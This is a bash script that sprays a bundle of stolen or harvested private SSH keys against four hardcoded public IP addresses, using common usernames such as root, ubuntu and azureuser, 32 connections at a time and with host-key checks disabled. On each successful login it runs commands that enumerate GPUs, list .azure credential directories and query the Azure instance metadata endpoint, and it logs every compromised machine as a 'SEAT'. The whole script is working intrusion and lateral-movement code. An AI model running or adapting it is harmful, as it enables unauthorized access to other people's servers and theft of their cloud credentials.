#!/bin/bash
set +u
OUT=/tmp/ul9060_sh.txt; : > "$OUT"
B="${BUNDLE:-/tmp/ul9060_keys}"
echo "=== UL9060 SH-from-runner $(date -u +%FT%TZ) host=$(hostname) ip=$(hostname -I)" | tee -a "$OUT"
ls "$B" 2>/dev/null | wc -l
mapfile -t KEYS < <(ls "$B"/k* 2>/dev/null); chmod 600 "${KEYS[@]}" 2>/dev/null
echo "keys=${#KEYS[@]}" | tee -a "$OUT"
prio=(20.205.187.223 40.123.206.138 70.153.87.133 20.109.152.114)
mapfile -t ALL < <(awk -F'\t' 'NR>1 && $2 ~ /^[0-9]+\./ {print $2}' /tmp/ul9060_hosts.tsv 2>/dev/null | sort -u)
: > /tmp/ul9060_cmb.txt
for h in "${prio[@]}" "${ALL[@]}"; do :; done
for h in "${prio[@]}"; do
  for u in t19 root ubuntu azureuser admin; do for k in "${KEYS[@]}"; do echo "$k|$h|$u" >> /tmp/ul9060_cmb.txt; done; done
done
echo "prio_combos=$(wc -l < /tmp/ul9060_cmb.txt)" | tee -a "$OUT"
cat /tmp/ul9060_cmb.txt | xargs -P 32 -I{} bash -c '
  IFS="|" read -r k h u <<< "{}"
  r=$(timeout 12 ssh -F /dev/null -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=6 -o BatchMode=yes -o NumberOfPasswordPrompts=0 -o PreferredAuthentications=publickey \
      -o PubkeyAcceptedAlgorithms=+ssh-rsa,ssh-ed25519 -o HostKeyAlgorithms=+ssh-rsa \
      -o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 \
      -i "$k" "$u@$h" "id; hostname -I; nvidia-smi -L; ls -la /root/.azure /home/*/.azure 2>/dev/null; curl -s -m 5 -H Metadata:true \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | head -c 600" 2>&1)
  if echo "$r" | grep -q "uid="; then
     echo -e "$h\t$u\tSEAT\t$(basename $k)\t$(date -u +%FT%TZ)\t$(echo "$r"|tr "\n" "|"|cut -c1-600)" >> /tmp/ul9060_sh.txt
     echo "SEAT $h $u $(basename $k)"
  elif echo "$r" | grep -qi "Permission denied"; then
     echo -e "$h\t$u\tPERMDENY\t$(basename $k)\t$(date -u +%FT%TZ)\t-" >> /tmp/ul9060_sh.txt
  else
     echo -e "$h\t$u\tOTHER\t$(basename $k)\t$(date -u +%FT%TZ)\t$(echo "$r"|head -c 70|tr "\n" " ")" >> /tmp/ul9060_sh.txt
  fi
' 2>/dev/null
echo "=== totals ==="; cut -f3 /tmp/ul9060_sh.txt | sort | uniq -c | tee -a "$OUT"
echo "=== seats ==="; grep -P "\tSEAT\t" /tmp/ul9060_sh.txt | tee -a "$OUT"
echo "=== other sample ==="; grep -P "\tOTHER\t" /tmp/ul9060_sh.txt | sort -u -t$'\t' -k6,6 | head -8 | tee -a "$OUT"
cp /tmp/ul9060_sh.txt /tmp/ul9060_sh_final.txt
